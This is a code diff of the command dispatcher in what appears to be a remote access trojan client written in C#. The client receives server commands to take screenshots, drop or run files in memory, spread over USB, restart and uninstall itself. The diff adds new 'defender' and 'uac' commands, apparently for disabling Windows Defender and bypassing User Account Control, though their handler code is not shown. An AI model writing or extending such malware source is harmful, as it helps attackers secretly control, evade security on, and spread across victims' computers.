@@ -25,35 +25,47 @@ namespace Client.Handle_Packet
                     case "sendMessage":
                         {
                             MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
+                            break;
                         }
-                        break;
 
                     case "Ping":
                         {
                             Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
+                            break;
                         }
-                        break;
 
 
                     case "thumbnails":
                         {
                             new HandleGetScreenShot();
+                            break;
                         }
-                        break;
 
                     case "sendFile":
                         {
                             Received();
                             new HandleSendTo().SendToDisk(unpack_msgpack);
+                            break;
                         }
-                        break;
 
                     case "sendMemory":
                         {
                             Received();
                             new HandleSendTo().SendToMemory(unpack_msgpack);
+                            break;
                         }
-                        break;
+
+                    case "defender":
+                        {
+                            new HandleWindowsDefender();
+                            break;
+                        }
+
+                    case "uac":
+                        {
+                            new HandleUAC();
+                            break;
+                        }
 
                     case "close":
                         {
@@ -64,8 +76,8 @@ namespace Client.Handle_Packet
                             }
                             catch { }
                             Environment.Exit(0);
+                            break;
                         }
-                        break;
 
                     case "restart":
                         {
@@ -77,14 +89,14 @@ namespace Client.Handle_Packet
                             catch { }
                             Process.Start(Application.ExecutablePath);
                             Environment.Exit(0);
+                            break;
                         }
-                        break;
 
                     case "uninstall":
                         {
                             new HandleUninstall();
+                            break;
                         }
-                        break;
 
                     case "usbSpread":
                         {
